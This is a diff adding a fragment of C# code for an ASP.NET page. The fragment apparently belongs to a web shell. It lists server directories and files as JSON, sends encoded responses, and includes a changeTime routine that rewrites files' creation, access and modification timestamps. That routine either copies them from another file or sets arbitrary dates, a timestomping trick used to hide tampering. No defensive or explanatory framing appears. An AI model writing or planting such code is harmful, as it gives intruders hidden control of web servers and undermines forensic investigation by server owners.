@@ -1,0 +1,24 @@
+    string createJsonDirectory(System.IO.DirectoryInfo[] dir){
+        string json="\"dir\":[";
+        for (int i=0;i<dir.Length;i++){
+            if (i>0)json+=",";
+            json +=string.Format("{{\"name\":\"{0}\",\"mdate\":\"{1}\"}}",dir[i].Name,dir[i].LastWriteTime.ToString("yyyy-MM-dd"));
+        }
+        json +="]";
+        return json;
+    }
+    string createJsonFile(System.IO.FileInfo[] file){
+        string json="\"file\":[";
+        for (int i=0;i<file.Length;i++){
+            if (i>0)json+=",";
+            json +=string.Format("{{\"name\":\"{0}\",\"size\":\"{1}\",\"mdate\":\"{2}\"}}",file[i].Name,sizeFix(file[i].Length),file[i].LastWriteTime.ToString("yyyy-MM-dd"));
+        }
+        json +="]";
+        return json;
+    }
+    string sizeFix(long size){double s=size;if(s<1024)return s+" B";s=s/1024;if(s<1024)return Math.Round(s,2)+" KB";s=s/1024;if(s<1024)return Math.Round(s,2)+" MB";s=s/1024;if(s<1024)return Math.Round(s,2)+" GB";s=s/1024;return Math.Round(s,2)+" TB";}
+    void response(string res){Response.Clear();Response.Write(tb(res));Response.Flush();Response.SuppressContent=true;ApplicationInstance.CompleteRequest();}
+    void changeTime(string timeh,string tfil,string ttar,string ttim){string ret="Error : -";try {if(!string.IsNullOrEmpty(tfil)){if(timeh=="1")ret=ti(tfil);else if(timeh=="2"){if(!string.IsNullOrEmpty(ttar)){System.IO.File.SetCreationTime(tfil,System.IO.File.GetCreationTime(ttar));System.IO.File.SetLastAccessTime(tfil,System.IO.File.GetLastAccessTime(ttar));System.IO.File.SetLastWriteTime(tfil,System.IO.File.GetLastWriteTime(ttar));ret="Time successfuly changed :<br>"+tfil+"<br>"+ti(tfil);}}else if(timeh=="3"){if(!string.IsNullOrEmpty(ttim)){DateTime te=DateTime.Parse(ttim);System.IO.File.SetCreationTime(tfil,te);System.IO.File.SetLastAccessTime(tfil,te);System.IO.File.SetLastWriteTime(tfil,te);ret="Time successfuly changed :<br>"+tfil+"<br>"+ti(tfil);}}}}catch(Exception e){ret="Error : "+e.Message;}response(ret);}
+    string ti(string tt){return "Creation Time :\t\t"+System.IO.File.GetCreationTime(tt).ToString("yyyy-MM-dd HH:mm:ss")+"<br>Last Access Time :\t"+System.IO.File.GetLastAccessTime(tt).ToString("yyyy-MM-dd HH:mm:ss")+"<br>Last Write Time :\t"+System.IO.File.GetLastWriteTime(tt).ToString("yyyy-MM-dd HH:mm:ss");}
+
+</script>
